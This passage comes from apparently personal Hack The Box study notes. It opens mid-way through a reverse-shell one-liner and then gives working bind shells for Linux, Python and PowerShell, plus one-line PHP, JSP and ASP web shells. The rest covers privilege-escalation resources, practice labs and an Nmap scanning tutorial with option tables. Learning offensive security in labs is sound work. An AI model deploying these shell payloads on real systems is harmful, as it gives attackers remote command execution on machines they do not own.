class=s2>);</span><span class=nv>$s</span><span class=s2>.Write(</span><span class=nv>$sbt</span><span class=s2>,0,</span><span class=nv>$sbt</span><span class=s2>.Length);</span><span class=nv>$s</span><span class=s2>.Flush()};</span><span class=nv>$client</span><span class=s2>.Close()&#34;</span>
</span></span></code></pre></div><ul><li>Another type of shell is a <code>Bind Shell</code>. Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets&rsquo; listening port. Once we execute a Bind Shell Command, it will start listening on a port on the remote host and bind that host&rsquo;s shell, i.e., Bash or PowerShell, to that port. We have to connect to that port with netcat, and we will get control through a shell on that system. <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md title="Payload All the Things" target=_blank rel="nofollow noopener">Payload All the Things</a> again has payloads for this.</li></ul><p><strong>Linux Victim</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>rm /tmp/f<span class=p>;</span>mkfifo /tmp/f<span class=p>;</span>cat /tmp/f<span class=p>|</span>/bin/bash -i 2&gt;<span class=p>&amp;</span>1<span class=p>|</span>nc -lvp <span class=m>1234</span> &gt;/tmp/f
</span></span><span class=line><span class=cl>...or...
</span></span><span class=line><span class=cl>python -c <span class=s1>&#39;exec(&#34;&#34;&#34;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&#34;0.0.0.0&#34;,1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&#34;&#34;&#34;)&#39;</span>
</span></span></code></pre></div><p><strong>Windows Victim</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powershell</span> <span class=n>-NoP</span> <span class=n>-NonI</span> <span class=n>-W</span> <span class=n>Hidden</span> <span class=n>-Exec</span> <span class=n>Bypass</span> <span class=n>-Command</span> <span class=nv>$listener</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Net.Sockets.TcpListener</span><span class=p>]</span><span class=mf>1234</span><span class=p>;</span> <span class=nv>$listener</span><span class=p>.</span><span class=py>start</span><span class=p>();</span><span class=nv>$client</span> <span class=p>=</span> <span class=nv>$listener</span><span class=p>.</span><span class=py>AcceptTcpClient</span><span class=p>();</span><span class=nv>$stream</span> <span class=p>=</span> <span class=nv>$client</span><span class=p>.</span><span class=py>GetStream</span><span class=p>();[</span><span class=no>byte[]</span><span class=p>]</span><span class=nv>$bytes</span> <span class=p>=</span> <span class=mf>0</span><span class=p>.</span><span class=mf>.65535</span><span class=p>|%{</span><span class=mf>0</span><span class=p>};</span><span class=k>while</span><span class=p>((</span><span class=nv>$i</span> <span class=p>=</span> <span class=nv>$stream</span><span class=p>.</span><span class=py>Read</span><span class=p>(</span><span class=nv>$bytes</span><span class=p>,</span> <span class=mf>0</span><span class=p>,</span> <span class=nv>$bytes</span><span class=p>.</span><span class=n>Length</span><span class=p>))</span> <span class=o>-ne</span> <span class=mf>0</span><span class=p>){;</span><span class=nv>$data</span> <span class=p>=</span> <span class=p>(</span><span class=nb>New-Object</span> <span class=n>-TypeName</span> <span class=n>System</span><span class=p>.</span><span class=py>Text</span><span class=p>.</span><span class=n>ASCIIEncoding</span><span class=p>).</span><span class=py>GetString</span><span class=p>(</span><span class=nv>$bytes</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span> <span class=nv>$i</span><span class=p>);</span><span class=nv>$sendback</span> <span class=p>=</span> <span class=p>(</span><span class=nb>iex </span><span class=nv>$data</span> <span class=mf>2</span><span class=p>&gt;&amp;</span><span class=mf>1</span> <span class=p>|</span> <span class=nb>Out-String</span> <span class=p>);</span><span class=nv>$sendback2</span> <span class=p>=</span> <span class=nv>$sendback</span> <span class=p>+</span> <span class=s2>&#34;PS &#34;</span> <span class=p>+</span> <span class=p>(</span><span class=n>pwd</span><span class=p>).</span><span class=py>Path</span> <span class=p>+</span> <span class=s2>&#34; &#34;</span><span class=p>;</span><span class=nv>$sendbyte</span> <span class=p>=</span> <span class=p>([</span><span class=no>text.encoding</span><span class=p>]::</span><span class=n>ASCII</span><span class=p>).</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$sendback2</span><span class=p>);</span><span class=nv>$stream</span><span class=p>.</span><span class=py>Write</span><span class=p>(</span><span class=nv>$sendbyte</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=nv>$sendbyte</span><span class=p>.</span><span class=n>Length</span><span class=p>);</span><span class=nv>$stream</span><span class=p>.</span><span class=py>Flush</span><span class=p>()};</span><span class=nv>$client</span><span class=p>.</span><span class=py>Close</span><span class=p>();</span>
</span></span></code></pre></div><ul><li>The final type of shell we have is a <code>Web Shell</code>. A <code>Web Shell</code> is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.</li></ul><p><strong>php</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>system</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s2>&#34;cmd&#34;</span><span class=p>]);</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p><strong>jsp</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;%</span> <span class=nx>Runtime</span><span class=o>.</span><span class=nx>getRuntime</span><span class=p>()</span><span class=o>.</span><span class=nx>exec</span><span class=p>(</span><span class=nx>request</span><span class=o>.</span><span class=nx>getParameter</span><span class=p>(</span><span class=s2>&#34;cmd&#34;</span><span class=p>));</span> <span class=o>%&gt;</span>
</span></span></code></pre></div><p><strong>asp</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;%</span> <span class=k>eval</span> <span class=nx>request</span><span class=p>(</span><span class=s2>&#34;cmd&#34;</span><span class=p>)</span> <span class=o>%&gt;</span>
</span></span></code></pre></div><h3 id=privesc-checklists>PrivEsc Checklists<a hidden class=anchor aria-hidden=true href=#privesc-checklists>#</a></h3><p>Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level. We can find many checklists and cheat sheets online that have a collection of checks we can run and the commands to run these checks. One excellent resource is <a href=https://book.hacktricks.xyz/ title=HackTricks target=_blank rel="nofollow noopener">HackTricks</a>, which has an excellent checklist for both <a href=https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist title=Linux target=_blank rel="nofollow noopener">Linux</a> and <a href=https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation title=Windows target=_blank rel="nofollow noopener">Windows</a> local privilege escalation. Another excellent repository is <a href=https://github.com/swisskyrepo/PayloadsAllTheThings title=PayloadsAllTheThings target=_blank rel="nofollow noopener">PayloadsAllTheThings</a>, which also has checklists for both <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md title=Linux target=_blank rel="nofollow noopener">Linux</a> and <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md title=Windows target=_blank rel="nofollow noopener">Windows</a>. We must start experimenting with various commands and techniques and get familiar with them to understand multiple weaknesses that can lead to escalating our privileges.</p><h3 id=enumeration-scripts>Enumeration Scripts<a hidden class=anchor aria-hidden=true href=#enumeration-scripts>#</a></h3><p>Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include <a href=https://github.com/rebootuser/LinEnum.git title=LinEnum target=_blank rel="nofollow noopener">LinEnum</a> and <a href=https://github.com/sleventyeleven/linuxprivchecker title=linuxprivchecker target=_blank rel="nofollow noopener">linuxprivchecker</a>, and for Windows include <a href=https://github.com/GhostPack/Seatbelt title=Seatbelt target=_blank rel="nofollow noopener">Seatbelt</a> and <a href=https://github.com/411Hall/JAWS title=JAWS target=_blank rel="nofollow noopener">JAWS</a>.</p><p>Another useful tool we may use for server enumeration is the <a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite title="Privilege Escalation Awesome Scripts SUITE (PEASS)" target=_blank rel="nofollow noopener">Privilege Escalation Awesome Scripts SUITE (PEASS)</a>, as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.</p><p><a href=https://gtfobins.github.io/ title=GTFOBins target=_blank rel="nofollow noopener">GTFOBins</a> contains a list of commands and how they can be exploited through <code>sudo</code></p><p><a href=https://lolbas-project.github.io/# title=LOLBAS target=_blank rel="nofollow noopener">LOLBAS</a> also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.</p><h3 id=practice-resources>Practice Resources<a hidden class=anchor aria-hidden=true href=#practice-resources>#</a></h3><table><thead><tr><th style=text-align:left>Platform</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><a href=https://owasp.org/www-project-juice-shop/ title="OWASP Juice Shop" target=_blank rel="nofollow noopener">OWASP Juice Shop</a></td><td style=text-align:left>Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire <a href=https://owasp.org/www-project-top-ten title="OWASP Top Ten" target=_blank rel="nofollow noopener">OWASP Top Ten</a> along with many other real-world application security flaws.</td></tr><tr><td style=text-align:left><a href=https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/ title="Metasploitable 2" target=_blank rel="nofollow noopener">Metasploitable 2</a></td><td style=text-align:left>Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation.</td></tr><tr><td style=text-align:left><a href=https://github.com/rapid7/metasploitable3 title="Metasploitable 3" target=_blank rel="nofollow noopener">Metasploitable 3</a></td><td style=text-align:left>Is a template for building a vulnerable Windows VM configured with a wide range of <a href=https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities title=vulnerabilities target=_blank rel="nofollow noopener">vulnerabilities</a>.</td></tr><tr><td style=text-align:left><a href=https://github.com/digininja/DVWA title=DVWA target=_blank rel="nofollow noopener">DVWA</a></td><td style=text-align:left>This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.</td></tr><tr><td style=text-align:left><a href=https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA title=IppSec target=_blank rel="nofollow noopener">IppSec</a></td><td style=text-align:left>Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques.</td></tr><tr><td style=text-align:left><a href=https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ title=VbScrub target=_blank rel="nofollow noopener">VbScrub</a></td><td style=text-align:left>Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation.</td></tr><tr><td style=text-align:left><a href=https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg title=STÖK target=_blank rel="nofollow noopener">STÖK</a></td><td style=text-align:left>Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing.</td></tr><tr><td style=text-align:left><a href=https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w title=LiveOverflow target=_blank rel="nofollow noopener">LiveOverflow</a></td><td style=text-align:left>Provides videos on a wide variety of technical infosec topics.</td></tr></tbody></table><h3 id=first-attack>First Attack<a hidden class=anchor aria-hidden=true href=#first-attack>#</a></h3><p>For an entire write-up of this box, see <a href=/posts/htb/easy/nibbles title="HTB Writeup: Nibbles">HTB Writeup: Nibbles</a>.</p><h3 id=complete-1>Complete<a hidden class=anchor aria-hidden=true href=#complete-1>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/77 title="Link of Completion" target=_blank rel="nofollow noopener">Link of Completion</a></p><p> </p><hr><p> </p><h2 id=network-enumeration-with-nmap>Network Enumeration with Nmap<a hidden class=anchor aria-hidden=true href=#network-enumeration-with-nmap>#</a></h2><h3 id=nmap-architecture>Nmap Architecture<a hidden class=anchor aria-hidden=true href=#nmap-architecture>#</a></h3><ul><li>Host discovery</li><li>Port scanning</li><li>Service enumeration and detection</li><li>OS detection</li><li>Scriptable interaction with the target service (Nmap Scripting Engine)</li></ul><h3 id=tcp-syn-scan>TCP-SYN Scan<a hidden class=anchor aria-hidden=true href=#tcp-syn-scan>#</a></h3><p>The TCP-SYN scan (<code>-sS</code>) is one of the default settings unless we have defined otherwise and is also one of the most popular scan methods. This scan method makes it possible to scan several thousand ports per second. The TCP-SYN scan sends one packet with the SYN flag and, therefore, never completes the three-way handshake, which results in not establishing a full TCP connection to the scanned port.</p><ul><li>If our target sends an <code>SYN-ACK</code> flagged packet back to the scanned port, Nmap detects that the port is open.</li><li>If the packet receives an <code>RST</code> flag, it is an indicator that the port is closed.</li><li>If Nmap does not receive a packet back, it will display it as filtered. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall.</li></ul><h3 id=scan-network-range>Scan Network Range<a hidden class=anchor aria-hidden=true href=#scan-network-range>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap 10.129.2.0/24 -sn -oA tnet <span class=p>|</span> grep <span class=k>for</span> <span class=p>|</span> cut -d<span class=s2>&#34; &#34;</span> -f5
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>10.129.2.4
</span></span><span class=line><span class=cl>10.129.2.10
</span></span><span class=line><span class=cl>10.129.2.11
</span></span><span class=line><span class=cl>10.129.2.18
</span></span><span class=line><span class=cl>10.129.2.19
</span></span><span class=line><span class=cl>10.129.2.20
</span></span><span class=line><span class=cl>10.129.2.28
</span></span></code></pre></div><table><thead><tr><th style=text-align:left>Scanning Options</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>10.129.2.0/24</code></td><td style=text-align:left>Target network range.</td></tr><tr><td style=text-align:left><code>-sn</code></td><td style=text-align:left>Disables port scanning.</td></tr><tr><td style=text-align:left><code>-oA tnet</code></td><td style=text-align:left>Stores the results in all formats starting with the name &rsquo;tnet'.</td></tr></tbody></table><h3 id=scan-ip-list>Scan IP List<a hidden class=anchor aria-hidden=true href=#scan-ip-list>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap -sn -oA tnet -iL hosts.lst <span class=p>|</span> grep <span class=k>for</span> <span class=p>|</span> cut -d<span class=s2>&#34; &#34;</span> -f5
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>10.129.2.18
</span></span><span class=line><span class=cl>10.129.2.19
</span></span><span class=line><span class=cl>10.129.2.20
</span></span></code></pre></div><table><thead><tr><th style=text-align:left>Scanning Options</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>-sn</code></td><td style=text-align:left>Disables port scanning.</td></tr><tr><td style=text-align:left><code>-oA tnet</code></td><td style=text-align:left>Stores the results in all formats starting with the name &rsquo;tnet'.</td></tr><tr><td style=text-align:left><code>-iL</code></td><td style=text-align:left>Performs defined scans against targets in provided &lsquo;hosts.lst&rsquo; list.</td></tr></tbody></table><h3 id=scan-multiple-ips>Scan Multiple IPs<a hidden class=anchor aria-hidden=true href=#scan-multiple-ips>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20<span class=p>|</span> grep <span class=k>for</span> <span class=p>|</span> cut -d<span class=s2>&#34; &#34;</span> -f5
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>10.129.2.18
</span></span><span class=line><span class=cl>10.129.2.19
</span></span><span class=line><span class=cl>10.129.2.20
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap -sn -oA tnet 10.129.2.18-20<span class=p>|</span> grep <span class=k>for</span> <span class=p>|</span> cut -d<span class=s2>&#34; &#34;</span> -f5
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>10.129.2.18
</span></span><span class=line><span class=cl>10.129.2.19
</span></span><span class=line><span class=cl>10.129.2.20
</span></span></code></pre></div><h3 id=scan-single-ip>Scan Single IP<a hidden class=anchor aria-hidden=true href=#scan-single-ip>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap 10.129.2.18 -sn -oA host
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2020-06-14 23:59 CEST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.2.18
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.087s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>MAC Address: DE:AD:00:00:BE:EF
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.11 seconds
</span></span></code></pre></div><table><thead><tr><th style=text-align:left>Scanning Options</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>10.129.2.18</code></td><td style=text-align:left>Performs defined scans against the target.</td></tr><tr><td style=text-align:left><code>-sn</code></td><td style=text-align:left>Disables port scanning.</td></tr><tr><td style=text-align:left><code>-oA host</code></td><td style=text-align:left>Stores the results in all formats starting with the name &lsquo;host&rsquo;.</td></tr></tbody></table><p>*<em>If we disable port scan (<code>-sn</code>), Nmap automatically ping scan with ICMP Echo Requests (<code>-PE</code>). Once such a request is sent, we usually expect an ICMP reply if the pinging host is alive. The more interesting fact is that our previous scans did not do that because before Nmap could send an ICMP echo request, it would send an ARP ping resulting in an ARP reply. We can confirm this with the &ldquo;<code>--packet-trace</code>&rdquo; option. To ensure that ICMP echo requests are sent, we also define the option (<code>-PE</code>) for this.</em></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2020-06-15 00:08 CEST
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0074s<span class=o>)</span> ARP who-has 10.129.2.18 tell 10.10.14.2
</span></span><span class=line><span class=cl>RCVD <span class=o>(</span>0.0309s<span class=o>)</span> ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.2.18
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.023s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>MAC Address: DE:AD:00:00:BE:EF
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.05 seconds
</span></span></code></pre></div><table><thead><tr><th style=text-align:left>Scanning Options</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>10.129.2.18</code></td><td style=text-align:left>Performs defined scans against the target.</td></tr><tr><td style=text-align:left><code>-sn</code></td><td style=text-align:left>Disables port scanning.</td></tr><tr><td style=text-align:left><code>-oA host</code></td><td style=text-align:left>Stores the results in all formats starting with the name &lsquo;host&rsquo;.</td></tr><tr><td style=text-align:left><code>-PE</code></td><td style=text-align:left>Performs the ping scan by using &lsquo;ICMP Echo requests&rsquo; against the target.</td></tr><tr><td style=text-align:left><code>--packet-trace</code></td><td style=text-align:left>Shows all packets sent and received.</td></tr></tbody></table><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo nmap 10.129.2.18 -sn -oA host -PE --reason
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2020-06-15 00:10 CEST
</span></span><span class=line><span class=cl>SENT <span class=o>(</span>0.0074s<span class=o>)</span> ARP who-has 10.129.2.18 tell 10.10.14.2
</span></span><span class=line><span class=cl>RCVD <span class=o>(</span>0.0309s<span class=o>)</span> ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.2.18
</span></span><span class=line><span class=cl>Host is up, received arp-response <span class=o>(</span>0.028s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>MAC Address: DE:AD:00:00:BE:EF
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.03 seconds
</span></span></code></pre></div><table><thead><tr><th style=text-align:left>Scanning Options</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>10.129.2.18</code></td><td style=text-align:left>Performs defined scans against the target.</td></tr><tr><td style=text-align:left><code>-sn</code></td><td style=text-align:left>Disables port scanning.</td></tr><tr><td style=text-align:left><code>-oA host</code></td><td style=text-align:left>Stores the results in all formats starting with the name &lsquo;host&rsquo;.</td></tr><tr><td style=text-align:left><code>-PE</code></td><td style=text-align:left>Performs the ping scan by using &lsquo;ICMP Echo requests&rsquo; against the target.</td></tr><tr><td style=text-align:left><code>--reason</code></td><td style=text-align:left>Displays the reason for specific result.</td></tr></tbody></table><h3 id=nmap-cheatsheet>Nmap Cheatsheet<a hidden class=anchor aria-hidden=true href=#nmap-cheatsheet>#</a></h3><p><strong>Scanning Options</strong></p><table><thead><tr><th style=text-align:left>Nmap Option</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>10.10.10.0/24</code></td><td style=text-align:left>Target network range.</td></tr><tr><td style=text-align:left><code>-sn</code></td><td style=text-align:left>Disables port scanning.</td></tr><tr><td style=text-align:left><code>-Pn</code></td><td style=text-align:left>Disables ICMP Echo Requests</td></tr><tr><td style=text-align:left><code>-n</code></td><td style=text-align:left>Disables DNS Resolution.</td></tr><tr><td style=text-align:left><code>-PE</code></td><td style=text-align:left>Performs the ping scan by using ICMP Echo Requests against the target.</td></tr><tr><td style=text-align:left><code>--packet-trace</code></td><td style=text-align:left>Shows all packets sent and received.</td></tr><tr><td style=text-align:left><code>--reason</code></td><td style=text-align:left>Displays the reason for a specific result.</td></tr><tr><td style=text-align:left><code>--disable-arp-ping</code></td><td style=text-align:left>Disables ARP Ping Requests.</td></tr><tr><td style=text-align:left><code>--top-ports=&lt;num></code></td><td style=text-align:left>Scans the specified top ports that have been defined as most frequent.</td></tr><tr><td style=text-align:left><code>-p-</code></td><td style=text-align:left>Scan all ports.</td></tr><tr><td style=text-align:left><code>-p22-110</code></td><td style=text-align:left>Scan all ports between 22 and 110.</td></tr><tr><td style=text-align:left><code>-p22,25</code></td><td style=text-align:left>Scans only the specified ports 22 and 25.</td></tr><tr><td style=text-align:left><code>-F</code></td><td style=text-align:left>Scans top 100 ports.</td></tr><tr><td style=text-align:left><code>-sS</code></td><td style=text-align:left>Performs an TCP SYN-Scan.</td></tr><tr><td style=text-align:left><code>-sA</code></td><td style=text-align:left>Performs an TCP ACK-Scan.</td></tr><tr><td style=text-align:left><code>-sU</code></td><td style=text-align:left>Performs an UDP Scan.</td></tr><tr><td style=text-align:left><code>-sV</code></td><td style=text-align:left>Scans the discovered services for their versions.</td></tr><tr><td style=text-align:left><code>-sC</code></td><td style=text-align:left>Perform a Script Scan with scripts that are categorized as &ldquo;default&rdquo;.</td></tr><tr><td style=text-align:left><code>--script &lt;script></code></td><td style=text-align:left>Performs a Script Scan by using the specified scripts.</td></tr><tr><td style=text-align:left><code>-O</code></td><td style=text-align:left>Performs an OS Detection Scan to determine the OS of the target.</td></tr><tr><td style=text-align:left><code>-A</code></td><td style=text-align:left>Performs OS Detection, Service Detection, and traceroute scans.</td></tr><tr><td style=text-align:left><code>-D RND:5</code></td><td style=text-align:left>Sets the number of random Decoys that will be used to scan the target.</td></tr><tr><td style=text-align:left><code>-e</code></td><td style=text-align:left>Specifies the network interface that is used for the scan.</td></tr><tr><td style=text-align:left><code>-S 10.10.10.200</code></td><td style=text-align:left>Specifies the source IP address for the scan.</td></tr><tr><td style=text-align:left><code>-g</code></td><td style=text-align:left>Specifies the source port for the scan.</td></tr><tr><td style=text-align:left><code>--dns-server &lt;ns></code></td><td style=text-align:left>DNS resolution is performed by using a specified name server.</td></tr></tbody></table><p><strong>Output Options</strong></p><table><thead><tr><th style=text-align:left>Nmap Option</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>-oA filename</code></td><td style=text-align:left>Stores the results in all available formats starting with the name of &ldquo;filename&rdquo;.</td></tr><tr><td style=text-align:left><code>-oN filename</code></td><td style=text-align:left>Stores the results in normal format with the name &ldquo;filename&rdquo;.</td></tr><tr><td style=text-align:left><code>-oG filename</code></td><td style=text-align:left>Stores the results in &ldquo;grepable&rdquo; format with the name of &ldquo;filename&rdquo;.</td></tr><tr><td style=text-align:left><code>-oX filename</code></td><td style=text-align:left>Stores the results in XML format with the name of &ldquo;filename&rdquo;.</td></tr></tbody></table><p><strong>Performance Options</strong></p><table><thead><tr><th style=text-align:left>Nmap Option</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>--max-retries &lt;num></code></td><td style=text-align:left>Sets the number of retries for scans of specific ports.</td></tr><tr><td style=text-align:left><code>--stats-every=5s</code></td><td style=text-align:left>Displays scan&rsquo;s status every 5 seconds.</td></tr><tr><td style=text-align:left><code>-v/-vv</code></td><td style=text-align:left>Displays verbose output during the scan.</td></tr><tr><td style=text-align:left><code>--initial-rtt-timeout 50ms</code></td><td style=text-align:left>Sets the specified time value as initial RTT timeout.</td></tr><tr><td style=text-align:left><code>--max-rtt-timeout 100ms</code></td><td style=text-align:left>Sets the specified time value as maximum RTT timeout.</td></tr><tr><td style=text-align:left><code>--min-rate 300</code></td><td style=text-align:left>Sets the number of packets that will be sent simultaneously.</td></tr><tr><td style=text-align:left><code>-T &lt;0-5></code></td><td style=text-align:left>Specifies the specific timing template.</td></tr></tbody></table><h3 id=host-and-port-scanning>Host and Port Scanning<a hidden class=anchor aria-hidden=true href=#host-and-port-scanning>#</a></h3><table><thead><tr><th style=text-align:left>State</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left>open</td><td style=text-align:left>This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations.</td></tr><tr><td style=text-align:left>closed</td><td style=text-align:left>When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not.</td></tr><tr><td style=text-align:left>filtered</td><td style=text-align:left>Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.</td></tr><tr><td style=text-align:left>unfiltered</td><td style=text-align:left>This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.</td></tr><tr><td style=text-align:left>open|filtered</td><td style=text-align:left>If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port.</td></tr><tr><td style=text-align:left>closed|filtered</td><td style=text-align:left>This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.</td></tr></tbody></table><h3 id=nmap-scripting-engine-nse>Nmap Scripting Engine (NSE)<a hidden class=anchor aria-hidden=true href=#nmap-scripting-engine-nse>#</a></h3><table><thead><tr><th style=text-align:left>Category</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left>auth</td><td style=text-align:left>Determination of authentication credentials.</td></tr><tr><td style=text-align:left>broadcast</td><td style=text-align:left>Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.</td></tr><tr><td style=text-align:left>brute</td><td style=text-align:left>Executes scripts that try to log in to the respective service by brute-forcing with credentials.</td></tr><tr><td style=text-align:left>default</td><td style=text-align:left>Default scripts executed by using the <code>-sC</code> option.</td></tr><tr><td style=text-align:left>discovery</td><td style=text-align:left>Evaluation of accessible services.</td></tr><tr><td style=text-align:left>dos</td><td style=text-align:left>These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.</td></tr><tr><td style=text-align:left>exploit</td><td style=text-align:left>This category of scripts tries to exploit known vulnerabilities for the scanned port.</td></tr><tr><td style=text-align:left>external</td><td style=text-align:left>Scripts that use external services for further processing.</td></tr><tr><td style=text-align:left>fuzzer</td><td style=text-align:left>This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.</td></tr><tr><td style=text-align:left>intrusive</td><td style=text-align:left>Intrusive scripts that could negatively affect the target system.</td></tr><tr><td style=text-align:left>malware</td><td style=text-align:left>Checks if some malware infects the target system.</td></tr><tr><td style=text-align:left>safe</td><td style=text-align:left>Defensive scripts that do not perform intrusive and destructive access.</td></tr><tr><td 